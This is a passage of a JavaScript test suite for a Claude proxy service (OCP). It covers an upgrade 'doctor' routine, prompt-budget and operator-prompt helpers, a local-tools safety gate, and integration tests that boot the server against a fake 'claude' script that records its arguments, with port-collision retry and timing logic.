    `fresh_install must call setup.mjs bare (enable+start) — got: ${setupStep}`);
});

test("doctor noop when current==latest", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.14.0", mockLatest: "v3.14.0" });
  assert.equal(result.next_action.kind, "noop");
  assert.equal(result.ready_to_upgrade, true);
});

test("doctor patch-bump same minor → update kind", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.14.0", mockLatest: "v3.14.1" });
  assert.equal(result.next_action.kind, "update");
});

test("doctor cross-minor → upgrade kind", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.10.0", mockLatest: "v3.14.0" });
  assert.equal(result.next_action.kind, "upgrade");
});

test("doctor OAuth FAIL → fix_oauth kind", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.10.0",
    mockLatest: "v3.14.0",
    mockHealth: { status: 200, body: { auth: { ok: false, message: "ENOEXEC" } } }
  });
  assert.equal(result.next_action.kind, "fix_oauth");
  assert.ok(result.next_action.ai_executable.some(c => c.includes("install.cjs")));
});

test("doctor service down → fix_service kind", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.10.0",
    mockLatest: "v3.14.0",
    mockHealth: { error: "ECONNREFUSED" }
  });
  assert.equal(result.next_action.kind, "fix_service");
});

test("doctor unparseable version → fresh_install", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "garbage", mockLatest: "v3.14.0" });
  assert.equal(result.from_version_supported, false);
  assert.equal(result.next_action.kind, "fresh_install");
});

test("doctor empty health body → fix_service (not fix_oauth)", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.10.0",
    mockLatest: "v3.14.0",
    mockHealth: { status: 200, body: null }
  });
  assert.equal(result.next_action.kind, "fix_service");
});

test("doctor falls back to currentVersion when origin/main unreachable (no stale latest)", async () => {
  // Use a non-existent ocpDir so git command fails; without the fix this would still
  // hard-code v3.14.0 as latest and recommend a downgrade for a future v3.15.0+ user.
  const result = await runDoctor({
    skipNetwork: true,
    mockVersion: "v3.15.0",
    ocpDir: "/nonexistent-ocp-dir-for-test"
  });
  assert.equal(result.latest_version, "v3.15.0");
  assert.equal(result.next_action.kind, "noop");
});

// ── Issue #214: doctor's noop must reflect the RUNNING SERVICE's version, not just the tree ──
// Root cause: a partially-failed `ocp update` can `git checkout` the new tag and then fail
// before the restart phase runs. The tree now looks fully updated, but the service (per
// /health) still answers with the OLD version. Before this fix, the next `ocp update` run
// compared tree==latest, found them equal, and reported kind="noop" — silently leaving the
// stale service running.
//
// RETRACTED CLAIM (PR #217, first draft): that draft reused kind="update" for the
// "tree==latest but service stale" case, reasoning that `_cmd_update_light`'s `git pull` was
// "a no-op here since the tree is already current". That reasoning was wrong and was rejected
// in review: doctor's "tree == latest" is a comparison of VERSION STRINGS (tree's
// package.json vs origin/main's package.json), not of commits. Between releases, origin/main
// can accumulate merged-but-unreleased commits while package.json stays put — so
// "tree == latest" can hold while origin/main HEAD is genuinely ahead of the release tag, and
// `git pull origin main --ff-only` would fast-forward a production host off its release tag
// onto unreleased code. Reusing "update" also silently dropped `ocp update --dry-run` and
// `--target` (`_cmd_update_light` never forwards "$@"), so a stale host would skip straight to
// a real mutating restart despite the documented "preview the plan, don't mutate" contract.
//
// Fixed shape: a new, distinct kind="restart" that never touches git — bash's
// `_cmd_update_restart` only calls `cmd_restart` + verifies via `postFlightOk`. The consumer
// cost of the new enum value was one `case` arm in `ocp` and one entry in this file's
// `ALLOWED` list — see the audit table in the PR body.
console.log("\nDoctor next_action.kind reflects running-service version (#214):");

test("#214: tree==latest, service reports the same version → genuinely noop", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } }
  });
  assert.equal(result.next_action.kind, "noop");
  assert.equal(result.ready_to_upgrade, true);
  assert.ok(!result.checks.some(c => c.id === "service_version_matches_tree"),
    "no stale-service warning expected when versions match");
});

test("#214: tree==latest, service reports an OLDER version → NOT noop, restart kind (no git)", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.25.0", auth: { ok: true } } }
  });
  assert.equal(result.next_action.kind, "restart");
  // WARN, not FAIL: ready_to_upgrade must stay true, or runUpgrade()'s pre-flight guard
  // (which only tolerates ready_to_upgrade=false for kind="fresh_install") would throw
  // instead of letting the restart proceed.
  assert.equal(result.ready_to_upgrade, true);
  const warning = result.checks.find(c => c.id === "service_version_matches_tree");
  assert.ok(warning, "expected a service_version_matches_tree check");
  assert.equal(warning.level, "WARN");
  assert.equal(warning.message, "tree at 3.26.0, service serving 3.25.0 — restarting");
});

test("#214: tree==latest, service reports a NEWER version → NOT auto-restarted (would downgrade)", async () => {
  // e.g. after a tree rollback, or someone running a newer/test build. Auto-restarting here
  // would silently DOWNGRADE a running service to match an older tree — the exact class of
  // surprise auto-mutation this issue is about. Surfaced (WARN) but not acted on: kind stays
  // "noop". Coverage gap flagged in PR #217 review: changing the comparison from `!== 0` to
  // `< 0` (i.e. only reacting to a STALE/older service) is required to survive this test —
  // the naive `!== 0` mutation treated a newer service as needing a "restart" too, which would
  // have downgraded it.
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.27.0", auth: { ok: true } } }
  });
  assert.equal(result.next_action.kind, "noop");
  assert.equal(result.ready_to_upgrade, true);
  const warning = result.checks.find(c => c.id === "service_version_matches_tree");
  assert.ok(warning, "expected a service_version_matches_tree check even though kind stays noop");
  assert.equal(warning.level, "WARN");
  assert.equal(warning.message, "tree at 3.26.0, service serving 3.27.0 (NEWER than tree) — not auto-restarting");
});

test("#214: tree==latest, /health unreachable → NOT noop (still fix_service)", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { error: "ECONNREFUSED" }
  });
  assert.equal(result.next_action.kind, "fix_service");
  assert.notEqual(result.next_action.kind, "noop");
});

test("#214: tree==latest, /health reachable but no version field → degrades gracefully to noop", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { auth: { ok: true } } } // no `version` key
  });
  assert.equal(result.next_action.kind, "noop");
  assert.equal(result.ready_to_upgrade, true);
});

test("#214: tree==latest, /health version field unparseable → degrades gracefully to noop", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "not-a-semver", auth: { ok: true } } }
  });
  assert.equal(result.next_action.kind, "noop");
  assert.equal(result.ready_to_upgrade, true);
});

// ── System-prompt operator append (CLAUDE_SYSTEM_PROMPT wiring) ─────────────
// The var was documented + echoed on /health but never reached a request (dead
// since APPEND_SYSTEM_PROMPT was retired — caught in PR #170 review). The wiring
// contract lives in lib/prompt.mjs. Mutation-proof: make appendOperatorPrompt
// return `base` unconditionally and the first test fails; make it stop trimming
// and the whitespace test fails.
import { appendOperatorPrompt, derivePromptCharBudget, resolvePromptCharBudget, selectPromptWrapper, localToolsSafetyError } from "./lib/prompt.mjs";

console.log("\nPrompt-char budget (ADR 0009 — SPOT-derived):");

// Mutation-proof: drop the ×charsPerToken and the first test fails; drop the
// Math.max floor guard and the floor tests fail; use min() instead of max() over
// windows and the largest-window test fails.
test("derivePromptCharBudget: LARGEST contextWindow × 3 chars/token", () => {
  const models = [{ contextWindow: 200000 }, { contextWindow: 100000 }];
  assert.equal(derivePromptCharBudget(models), 600000);
});

test("derivePromptCharBudget: matches the live models.json SPOT (200k → 600k today)", () => {
  const spot = JSON.parse(tuiReadFileSync(new URL("./models.json", import.meta.url), "utf8"));
  assert.equal(derivePromptCharBudget(spot.models), 600000);
});

test("derivePromptCharBudget: floor wins over a tiny/absent window; empty input → floor", () => {
  assert.equal(derivePromptCharBudget([{ contextWindow: 1000 }]), 150000, "3k chars would truncate everything — floor guards it");
  assert.equal(derivePromptCharBudget([]), 150000);
  assert.equal(derivePromptCharBudget(undefined), 150000);
  assert.equal(derivePromptCharBudget([{ id: "x" }, { contextWindow: "junk" }, { contextWindow: -5 }]), 150000);
});

test("derivePromptCharBudget: charsPerToken and floor are tunable parameters", () => {
  assert.equal(derivePromptCharBudget([{ contextWindow: 1000000 }], { charsPerToken: 3 }), 3000000);
  assert.equal(derivePromptCharBudget([], { floor: 42 }), 42);
});

// PR #179 review regression: EMPTY env value must mean "use the default" (the old
// `parseInt(env || "150000")` contract). Mutation-proof: switch the resolver's
// truthiness check to `!= null` and the empty-string test fails (NaN ≠ 600000).
test("resolvePromptCharBudget: empty/unset env → SPOT-derived default, never NaN", () => {
  const models = [{ contextWindow: 200000 }];
  assert.equal(resolvePromptCharBudget("", models), 600000, "CLAUDE_MAX_PROMPT_CHARS= (empty) must fall back to derived");
  assert.equal(resolvePromptCharBudget(undefined, models), 600000);
});

test("resolvePromptCharBudget: a set env value overrides the derivation absolutely", () => {
  const models = [{ contextWindow: 200000 }];
  assert.equal(resolvePromptCharBudget("300000", models), 300000);
  assert.equal(resolvePromptCharBudget("150000", models), 150000, "explicit legacy value wins over the bigger derived default");
});

console.log("\nSystem-prompt operator append:");

test("appendOperatorPrompt: appends the operator prompt LAST, blank-line separated", () => {
  assert.equal(appendOperatorPrompt("WRAPPER\n\nclient", "Answer in Chinese."), "WRAPPER\n\nclient\n\nAnswer in Chinese.");
});

test("appendOperatorPrompt: unset/empty/whitespace-only → base returned BYTE-IDENTICAL", () => {
  const base = "WRAPPER\n\nclient sys";
  assert.equal(appendOperatorPrompt(base, undefined), base);
  assert.equal(appendOperatorPrompt(base, ""), base);
  assert.equal(appendOperatorPrompt(base, "   \n "), base, "a stray space in a service unit must not inject anything");
  assert.equal(appendOperatorPrompt(base, null), base);
});

test("appendOperatorPrompt: operator value is trimmed before appending", () => {
  assert.equal(appendOperatorPrompt("W", "  hi  "), "W\n\nhi");
});

// ── OCP_LOCAL_TOOLS wrapper selection + safety gate (lib/prompt.mjs) ──────────
console.log("\nOCP_LOCAL_TOOLS wrapper + safety gate:");

const NEG = "You do NOT have access to any local filesystem";
const POS = "you may use your available local tools";

test("selectPromptWrapper: default (disabled) returns the negative wrapper BYTE-IDENTICAL", () => {
  // Mutation-proof: flip the ternary and the default path leaks the positive wrapper.
  assert.equal(selectPromptWrapper(false, NEG, POS), NEG);
});

test("selectPromptWrapper: enabled returns the positive (local-tools) wrapper", () => {
  assert.equal(selectPromptWrapper(true, NEG, POS), POS);
});

test("localToolsSafetyError: disabled → null regardless of an otherwise-unsafe deploy", () => {
  // The gate must not fire when the flag is off — the default path is never blocked.
  assert.equal(localToolsSafetyError({ enabled: false, authMode: "multi", loopbackBind: false, anonymousKey: true }), null);
});

test("localToolsSafetyError: enabled on a safe single-user loopback instance → null (boots)", () => {
  assert.equal(localToolsSafetyError({ enabled: true, authMode: "none", loopbackBind: true, anonymousKey: false }), null);
  assert.equal(localToolsSafetyError({ enabled: true, authMode: "shared", loopbackBind: true, anonymousKey: false }), null);
});

test("localToolsSafetyError: enabled + AUTH_MODE=multi → fatal (guest could be told it has FS)", () => {
  const e = localToolsSafetyError({ enabled: true, authMode: "multi", loopbackBind: true, anonymousKey: false });
  assert.ok(e && /multi/.test(e), `expected a multi-tenant fatal, got: ${e}`);
});

test("localToolsSafetyError: enabled + non-loopback bind → fatal (network-exposed)", () => {
  const e = localToolsSafetyError({ enabled: true, authMode: "none", loopbackBind: false, anonymousKey: false });
  assert.ok(e && /loopback/.test(e), `expected a loopback fatal, got: ${e}`);
});

test("localToolsSafetyError: enabled + anonymous key → fatal (unnamed callers)", () => {
  const e = localToolsSafetyError({ enabled: true, authMode: "none", loopbackBind: true, anonymousKey: true });
  assert.ok(e && /ANONYMOUS/i.test(e), `expected an anonymous-key fatal, got: ${e}`);
});

test("localToolsSafetyError: multi is checked before loopback/anon (most severe first)", () => {
  // A deploy that trips several conditions reports the multi-tenant one — the strongest signal.
  const e = localToolsSafetyError({ enabled: true, authMode: "multi", loopbackBind: false, anonymousKey: true });
  assert.ok(/multi/.test(e));
});

// ── OCP_LOCAL_TOOLS INTEGRATION: boot real server.mjs, observe the -p spawn ──────────
// The unit tests above prove the pure helpers. These close the INTEGRATION SEAM the suite
// otherwise can't reach (server.mjs boots a listener on import): a fake `claude` captures the
// exact --system-prompt OCP spawns it with, so we assert the SELECTED wrapper actually reaches
// a request — and boot-gate refusals are asserted by the process exit code. Without these, the
// wiring (extractSystemPrompt using SYSTEM_PROMPT_WRAPPER, the boot gate, the epoch fold) can be
// silently reverted with the unit suite still green — the maintainer's #1 rejection pattern.
import { spawn as _ltSpawn, execFileSync as _ltExecFile } from "node:child_process";
import { createServer as _ltNetServer } from "node:net";
import { writeFileSync as _ltWrite, chmodSync as _ltChmod, readFileSync as _ltRead, existsSync as _ltExists, rmSync as _ltRm, mkdtempSync as _ltMkdtemp } from "node:fs";
import { tmpdir as _ltTmp } from "node:os";
import { fileURLToPath as _ltF2P } from "node:url";

const LT_SERVER = _ltF2P(new URL("./server.mjs", import.meta.url));
const LT_POSIX = process.platform !== "win32"; // fake is a /bin/sh script; CI is POSIX
const LT_NEG_MARK = "You do NOT have access to any local filesystem";
const LT_POS_MARK = "you may use your available local tools";
// Fake claude: record the --system-prompt it was spawned with, bump an optional spawn counter,
// then emit a minimal valid stream-json response so the request completes (and caches).
const LT_FAKE = `#!/bin/sh
prev=""
for a in "$@"; do
  if [ "$prev" = "--system-prompt" ]; then printf '%s' "$a" > "$SP_CAPTURE"; fi
  prev="$a"
done
if [ -n "$SP_COUNTER" ]; then c=$(cat "$SP_COUNTER" 2>/dev/null || echo 0); echo $((c+1)) > "$SP_COUNTER"; fi
printf '%s\\n' '{"type":"assistant","message":{"content":[{"type":"text","text":"OK"}]}}'
printf '%s\\n' '{"type":"result"}'
exit 0
`;

function ltMkdir() { return _ltMkdtemp(join(_ltTmp(), "ocp-lt-")); }
function ltFake(dir) { const p = join(dir, "claude"); _ltWrite(p, LT_FAKE); _ltChmod(p, 0o755); return p; }
// #248 mutation-table support: a deterministic, non-timing-based measurement of what ltTest's
// serialization actually guarantees. Timing-based reproduction of "the queue isn't serializing"
// became unreliable once the ltWait cap (below) was raised to 10x in response to review — the
// adaptive wait got good enough at absorbing even self-inflicted concurrency that a bypassed
// queue often no longer produces an observable assertion failure under available load, which
// would make a mutation of ltTest's queue non-load-bearing by the letter of a timing-only test
// even though the code is genuinely doing less work. Counting ACTUAL concurrent children sidesteps
// that: it's a fact about how many server.mjs processes were alive at once, not a race against
// wall-clock luck. See the assertion at the end of this integration block.
let _ltActiveBoots = 0;
let _ltPeakBoots = 0;
function ltBoot(env, dir, nodeArgs = []) {
  const child = _ltSpawn(process.execPath, [...nodeArgs, LT_SERVER], {
    env: { ...process.env, NODE_ENV: "test", OCP_DIR_OVERRIDE: dir, OCP_SKIP_AUTH_TEST: "1",
           CLAUDE_BIND: "127.0.0.1", CLAUDE_AUTH_MODE: "none", CLAUDE_CACHE_TTL: "0", CLAUDE_TIMEOUT: "4000", ...env },
    stdio: ["ignore", "pipe", "pipe"],
  });
  _ltActiveBoots++;
  _ltPeakBoots = Math.max(_ltPeakBoots, _ltActiveBoots);
  const buf = { out: "", err: "", exit: undefined, signal: undefined, closed: false, closeMs: undefined, spawnErr: null, t0: Date.now() };
  child.stdout.on("data", d => { buf.out += d; });
  child.stderr.on("data", d => { buf.err += d; });
  // 'exit' fires when the process terminates, but its stdio pipes may still hold unread data —
  // 'close' is the one that guarantees both are drained. A test that terminates the child and
  // then asserts on buf.err/buf.out must wait for `closed`, not `exit != null`, or it can read
  // an empty buffer.
  child.on("exit", (code, signal) => { buf.exit = code; buf.signal = signal; });
  child.on("close", () => { buf.closed = true; buf.closeMs = Date.now() - buf.t0; _ltActiveBoots--; });
  // Without a listener, a spawn 'error' is re-thrown as an uncaught exception and takes down the
  // whole runner instead of failing one test.
  child.on("error", e => { buf.spawnErr = e; });
  return { child, buf };
}
// child.kill("SIGKILL") kills server.mjs but NOT the fake `claude` grandchildren it spawned, and
// those can still be writing sp.txt / spawns.txt into `dir` while rmSync walks it — which surfaced
// as an intermittent ENOTEMPTY (4/200 in review). Node's own retry loop handles the window.
function _ltRmRetry(dir) {
  try { _ltRm(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 }); }
  catch (e) {
    // Never throw: this runs in a finally, so a throw here would REPLACE the real assertion
    // error and make a flake look like a regression. LT_DEBUG surfaces it without that risk.
    if (process.env.LT_DEBUG) console.warn(`    [ltRmRetry] ${dir}: ${e.code || e.message}`);
  }
}
// Every ltBoot assertion failure should be self-diagnosing. The historical failure text was
// `expected a local-tools FATAL, got: ` — an empty string, which says nothing about whether the
// child never wrote, wrote to the other stream, died on a signal, or was never spawned.
// stdout is sampled HEAD+TAIL, not tail-only. The decisive string for "it booted instead of
// refusing" is "Local tools: ON", and it lives in the boot banner — a tail-only sample answered
// the wrong question for exactly the tests this exists to diagnose.
//
// The head is sized to the BANNER, not picked round: measured on this tree, the banner runs 1118B
// with "Local tools: ON" at byte 581, so 900 clears it with ~5 banner lines of margin. That sizing
// is what makes it robust — the banner is emitted first and is bounded, so however much request
// noise follows, byte 581 stays in the head. A head of 120 does NOT reach it (verified: the string
// landed in the elided middle), which is why this is not the obvious small window.
// stderr stays head-only: a fatal is the first thing it writes.
function ltHeadTail(s, head = 900, tail = 160) {
  return s.length <= head + tail ? s : `${s.slice(0, head)}…[${s.length - head - tail}B]…${s.slice(-tail)}`;
}
function ltDiag(buf) {
  // closeMs disambiguates "died before reaching the gate" from "ran, then gated" — an exit=1
  // with empty stderr is equally consistent with both, and they have unrelated root causes.
  // node= is here because a Node-version-specific stderr warning (22's SQLite ExperimentalWarning)
  // once masqueraded as "server did not start" for ~23 of 50 runs on a Linux box.
  const ms = buf.closeMs !== undefined ? `${buf.closeMs}ms` : `${Date.now() - buf.t0}ms(still open)`;
  return `exit=${buf.exit} signal=${buf.signal} closed=${buf.closed} closeMs=${ms} node=${process.version}` +
         (buf.spawnErr ? ` spawnErr=${buf.spawnErr.code || buf.spawnErr.message}` : "") +
         ` | stderr(${buf.err.length}B)=${JSON.stringify(buf.err.slice(0, 240))}` +
         ` | stdout(${buf.out.length}B)=${JSON.stringify(ltHeadTail(buf.out))}`;
}
// #248: a plain `Date.now() - start < ms` ceiling is wall-clock-fixed and blows through under
// host contention — not because the child is genuinely slower by a bounded factor, but because
// THIS process's own event loop stalls under the same CPU pressure, so the 40ms `setTimeout`
// below fires late. That lateness is directly measurable (the actual gap between consecutive
// ticks vs. the 40ms requested), and it is the same signal that is starving the `server.mjs`
// child we're waiting on — so instead of a bigger constant, feed the measured overshoot back
// into the deadline. A quiet host (overshoot ~0) leaves the ceiling exactly where it was; a
// contended one gets exactly as much extra patience as the contention actually cost it.
// Capped so a genuinely wedged process still fails the assertion instead of hanging
// indefinitely — NOT a guarantee that this cap covers any possible level of host contention,
// there isn't one. It's sized against what was actually measured, not assumed: the issue's own
// report showed a 9000ms ceiling reading back at closeMs≈11509ms (~1.3x) under two overlapping
// `npm test` runs; an independent reviewer of this PR measured ~3.56x (closeMs≈32056ms against
// 9000ms) under a matched-control 2-competing-suite test; validating this fix on an unusually
// loaded shared dev host (several concurrent, unrelated agent sessions observed via `ps`) saw
// total waits equivalent to ~2x-4x nominal on individual assertions. 10x is headroom over the
// worst of those, not a proof of sufficiency for arbitrary contention — a host busy enough to
// exceed it will still fail loudly (not hang forever), just after a longer wait.
async function ltWait(cond, ms = 9000) {
  const start = Date.now();
  let deadline = start + ms;
  const hardCap = start + ms * 10;
  while (Date.now() < deadline) {
    if (cond()) return true;
    const before = Date.now();
    await new Promise(r => setTimeout(r, 40));
    const overshoot = (Date.now() - before) - 40;
    if (overshoot > 0) deadline = Math.min(deadline + overshoot, hardCap);
  }
  return cond();
}
async function ltFreePort() {
  const srv = _ltNetServer();
  await new Promise(r => srv.listen(0, "127.0.0.1", r));
  const p = srv.address().port;
  await new Promise(r => srv.close(r));
  return p;
}
// #219: ltFreePort()'s bind-then-close-then-return-the-number is a textbook TOCTOU — the port
// is unowned between our close() and the child's own listen(), and anything (a sibling
// ltFreePort() in this same process, a concurrent suite process, or an unrelated outbound
// connection) can take it in that window. Closing the window entirely would mean the CHILD
// binds :0 itself and reports the port it actually got — but the banner's port comes from the
// configured value, not `server.address().port` (server.mjs:3638), so that fix lives in
// server.mjs and is out of scope here (test-infra only; no cli.js citation would apply to it
// either way, and out-of-scope server.mjs changes are exactly what this repo's governance
// exists to prevent). That leaves narrowing the window's IMPACT: detect a collision and retry
// with a FRESH port rather than reusing the one that just lost the race.
//
// A collided child is silent, not crashed: server.mjs installs a process-wide
// `uncaughtException` handler that logs and swallows (server.mjs:3553), so a failed
// `server.listen()` never reaches "listening on", never exits, and never closes on its own —
// it just hangs until something kills it. The only signal is on stderr, written by that
// handler's `logEvent("error", "uncaught_exception", {...})`
// (server.mjs:862-869 -> console.error(JSON.stringify({level:"error", event:"uncaught_exception",
// error: "listen EADDRINUSE: ..."}))). LT_EADDRINUSE_RE below is that exact shape.
//
// The probe window (LT_COLLISION_PROBE_MS) only has to catch the DEFINITIVE collision
// signature, not decide whether a slow-but-healthy boot will eventually succeed. On any other
// signal (success, a non-collision exit, or the probe window simply elapsing) this returns
// immediately and lets the caller's own existing ltWait(...) call — already present in every
// test body — do the rest, unchanged: a slow-but-uncollided boot is not retried here. This is
// NOT a claim of being unaffected by #248's contention -- ltBootFresh's own probe is itself a
// wait, so under heavy contention this function's total worst-case time does grow (bounded by
// LT_COLLISION_PROBE_MS x maxAttempts). What it IS orthogonal to is #248's actual fix: this
// function doesn't touch ltWait's ceiling/backoff logic, which is shared by every caller in the
// file and is #248's territory. The two changes are independent even though both, separately,
// make ltBoot-based tests take longer to fail under contention.
//
// maxAttempts=3, each with a FRESH port (never the one that just collided): the issue measured
// 7/300 (~2.3%) on Linux CI at 4-way concurrency. Treating attempts as independent draws,
// P(all 3 collide) ~= 0.023^3 ~= 1.2e-5 -- roughly a 2000x reduction in the residual failure
// rate for the same host conditions that produced 7/300.
const LT_EADDRINUSE_RE = /"event":"uncaught_exception"[^\n]*EADDRINUSE/;
// Generous, not tight: reaching server.listen() at all needs the same startup work (module
// load, sqlite open, etc.) that a successful boot needs, so under host contention the collision
// signature can be just as slow to appear as "listening on" is. A too-short probe doesn't cause
// a false positive, only a false NEGATIVE — it falls through to "not (yet) collided" and hands
// back to the caller's own wait, which is safe but forfeits the retry; too short was observed
// directly while validating this fix: an earlier 5000ms probe made the deterministic regression
// test below fail (the outer wait timed out with the EADDRINUSE line already present in stderr
// by the time the failure was reported — the probe had simply given up before noticing it).
// 20000ms was re-tested and passed reliably, repeatedly, under the same host/load conditions
// that made 5000ms fail -- but re-running the suite later, alongside heavier ambient contention
// from other concurrent sessions on the same dev host (multiple full `npm test` runs from
// unrelated agent worktrees observed via `ps` while validating this fix), 20000ms ALSO proved
// too short (closeMs~54s, still open). test.yml runs this on an isolated ubuntu-latest runner
// with nothing else scheduled on it (see that workflow's own comment), so CI is not exposed to
// this class of contention -- the risk is specific to a shared dev host running several agent
// sessions at once, which is exactly the scenario #248 and #219 both exist because of. Set
// generously enough to absorb that, since the cost of a slow PASS here is just wall-clock time,
// not correctness: the end-to-end total this test can take is bounded by LT_COLLISION_PROBE_MS
// (this attempt's probe) plus whatever the retry's own boot needs, which is a separate, explicit
// ceiling at the call site below — not this constant.
const LT_COLLISION_PROBE_MS = 45000;
// onPort(port, attempt), if given, runs after the port is drawn but before the child spawns —
// test-only instrumentation (this whole function is test-side, not server.mjs, so there's no
// "production hook" concern here) that lets a dedicated regression test occupy the exact port
// just handed back and DETERMINISTICALLY reproduce the race window instead of waiting on rare
// natural timing. See "ltBootFresh recovers from a forced port collision" below.
async function ltBootFresh(env, dir, nodeArgs = [], maxAttempts = 3, onPort = null) {
  let last = null;
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    const port = await ltFreePort();
    if (onPort) await onPort(port, attempt);
    const result = ltBoot({ ...env, CLAUDE_PROXY_PORT: String(port) }, dir, nodeArgs);
    const { buf } = result;
    // Every terminal signal ends the probe promptly, not just a clean exit: buf.exit stays null
    // on a SIGKILL/SIGTERM death (Node reports code=null there), so buf.exit != null alone would
    // miss it and burn the full LT_COLLISION_PROBE_MS on a child that already died. buf.closed
    // (fires on 'close', after any exit/signal) and buf.spawnErr (fires on 'error', e.g. ENOENT)
    // catch those. This also means an attempt's own buf.spawnErr is populated BEFORE this
    // function returns, so a caller doesn't need its own late-attached listener to see it.
    await ltWait(() =>
      buf.out.includes("listening on") || buf.exit != null || buf.closed || buf.spawnErr ||
      LT_EADDRINUSE_RE.test(buf.err),
      LT_COLLISION_PROBE_MS);
    last = { ...result, port };
    if (!LT_EADDRINUSE_RE.test(buf.err)) return last; // success, a different failure, or just still booting
    if (process.env.LT_DEBUG) console.warn(`    [ltBootFresh] port ${port} collided (EADDRINUSE), retry ${attempt}/${maxAttempts}`);
    result.child.kill("SIGKILL"); // this attempt is dead on a bad port; free it before redrawing
    // Same gap as ltTest's between-test drain and bootOnce's sequential-boot fix (#248):
    // kill() only SENDS the signal, 'close' (and _ltActiveBoots's decrement) fires
    // asynchronously after. Without waiting here, the NEXT attempt's ltBoot() call — a couple
    // lines up, next loop iteration — could overlap this collided child's still-in-flight
    // teardown, pushing _ltActiveBoots above 1 even though only one attempt is ever meant to be
    // "live" at a time. Caught by the #248 peak-concurrency regression test once this test
    // (added by #219) joined that same ltTest queue.
    await ltWait(() => buf.closed, 5000);
  }
  return last; // attempts exhausted — hand back the last (still-collided) attempt for the caller to diagnose
}
async function ltPost(port, body) {
  try {
    await fetch(`http://127.0.0.1:${port}/v1/chat/completions`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body),
    });
  } catch { /* the fake may close the socket; the spawn (and capture) already happened */ }
}

// #248: `test()` settles an async body's promise before printing/counting it (see the
// `pendingAsync` comment at the top of this file), but it does NOT wait for that promise before
// returning — every `test(name, async () => {...})` call in this ltBoot block starts running
// its body (and therefore spawns its own `server.mjs` child) as soon as it is registered. With
// ~11 such tests in this file, one `npm test` invocation alone could have ~11-12 real server
// children alive at once, competing for CPU/IO with each other before a second suite process
// even enters the picture. `ltTest` chains these bodies onto a private queue so at most one is
// EXECUTING (i.e. has actually called ltFreePort/ltBoot) at a time within this process — the
// rest of the suite (plain `test()`/`testAsync()`) is untouched and keeps its existing
// concurrency. This does not by itself make the suite contention-proof against a SIBLING
// `npm test` process; that's what the adaptive ltWait ceiling above is for. Together: this
// suite stops manufacturing its own worst-case concurrency, and what contention remains (from
// something else on the host) is tolerated rather than blown through.
//
// The queue's STARTING point matters too, not just the chain between its own 11 members. An
// independent reviewer of this PR caught that seeding `_ltQueue` with an already-resolved
// promise lets the FIRST ltTest body start on the very next microtask — i.e. essentially
// immediately after this synchronous top-level pass finishes registering every test() in the
// file — which puts it in a burst alongside every OTHER async test body's own first resumption
// (not just this block's, which are correctly deferred; every plain test()/testAsync() body
// elsewhere already started running synchronously up to its own first await at REGISTRATION
// time, and its continuation is one microtask away too). The reviewer reproduced this: under
// two competing full suites, the first entry in the queue failed reproducibly while later
// entries did not. Seeding the queue with a snapshot of pendingAsync (everything already
// registered by the time this line runs) makes the first ltTest body wait for those to settle
// first, the same way each subsequent ltTest already waits for its predecessor. It does not
// (cannot, without a much larger change to how this whole file schedules tests) shield the
// first entry from async tests registered LATER in the file, whose own first synchronous slice
// already ran during the same top-level pass — that residual exposure is why the ltWait fix
// above exists, not a gap this queue is meant to close by itself.
let _ltQueue = Promise.allSettled([...pendingAsync]).then(() => {});
function ltTest(name, fn) {
  test(name, () => {
    const run = _ltQueue.then(fn, fn);
    // A test's own promise settles as soon as its assertions finish; its `finally { child.kill
    // ("SIGKILL"); ... }` only SENDS the signal — 'close' (and _ltActiveBoots's decrement) fires
    // asynchronously afterward, so without this the NEXT queued test could call ltBoot() while
    // the PREVIOUS one's child is still mid-teardown, briefly pushing _ltActiveBoots to 2 (a
    // false claim of "at most one at a time" — caught by the peak-count regression test below).
    // Draining to 0 here, not in the individual finally blocks, keeps the guarantee in ONE
    // place instead of requiring every ltBoot-based test to get its own teardown wait right.
    _ltQueue = run.catch(() => {}).then(() => ltWait(() => _ltActiveBoots === 0, 5000));
    return run;
  });
}

console.log("\nOCP_LOCAL_TOOLS integration (boot server.mjs):");

// #219 regression: the natural race is rare by construction (the issue measured 7/300 on Linux
// CI) -- too rare to gate a mutation on. This forces it deterministically: occupy the EXACT
// port ltFreePort() just handed back, in the same window a sibling process would exploit, so
// the first real server.mjs child hits a genuine EADDRINUSE (not a simulated one) and
// ltBootFresh's retry path is exercised end to end against real processes and a real socket
// collision -- port drawn for real, child spawned for real, collision forced for real, retry
// for real, success for real. Wrapped in ltTest (#248), same as every other test in this block
// spawning a real server.mjs child -- this one is no exception, and being unwrapped would both
// let it race the others and put it back outside #248's peak-concurrency guarantee.
ltTest("integration: ltBootFresh recovers from a forced port collision by retrying on a fresh port (#219)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir);
  let blocker = null;
  const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake }, dir, [], 3, async (p, attempt) => {
    if (attempt === 1) {
      blocker = _ltNetServer();
      await new Promise(r => blocker.listen(p, "127.0.0.1", r));
    }
  });
  try {
